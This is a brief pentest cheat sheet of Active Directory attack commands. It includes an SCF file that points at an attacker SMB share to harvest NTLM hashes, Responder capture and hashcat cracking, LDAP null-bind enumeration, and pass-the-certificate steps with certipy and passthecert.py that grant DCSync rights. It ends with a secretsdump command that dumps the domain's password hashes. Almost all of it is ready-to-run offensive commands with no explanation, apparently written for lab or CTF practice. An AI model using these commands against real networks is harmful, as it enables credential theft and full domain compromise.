# Active Directory Initial Attack Vectors
### SCF FILE TO GATHER HASHES
```
[Shell]
Command=2
IconFile=\\X.X.X.X\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

```
responder -wrf --lm -v -I eth0
```
**Crack Responder Hash**
```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
```

### LDAP NULL BIND
```
ldapsearch -x -b "dc=MEGABANK,dc=local" "*" -H ldap://10.10.10.169:389
```
```
ldapsearch -x -b "dc=MEGABANK,dc=local" "*" -H ldap://10.10.10.169:389 | awk '/dn: / {print $2}'
```
```
ldapsearch -x -b "dc=MEGABANK,dc=local" "objectclass=user" "description" "name" "samaccountname" -H ldap://10.10.10.169:389
```

# Active Directory Post Compromise
### Get All Domain Joined Computers
```
Get-ADComputer -Filter * -Properties  * | Select Name, DistinguishedName
```


# AD PrivEsc
### Pass the Certificate
```
# extract key and cert from the pfx
certipy cert -pfx "PATH_TO_PFX_CERT" -nokey -out "user.crt"
certipy cert -pfx "PATH_TO_PFX_CERT" -nocert -out "user.key"

# authenticate usng certificate
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100

# elevate a user for DCSYNC with passthecert.py
passthecert.py -action modify_user -crt "PATH_TO_CRT" -key "PATH_TO_KEY" -domain "domain.local" -dc-ip "DC_IP" -target "SAM_ACCOUNT_NAME" -elevate
```
### DCSync attack
```
# dumping NTDS.dit
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
```
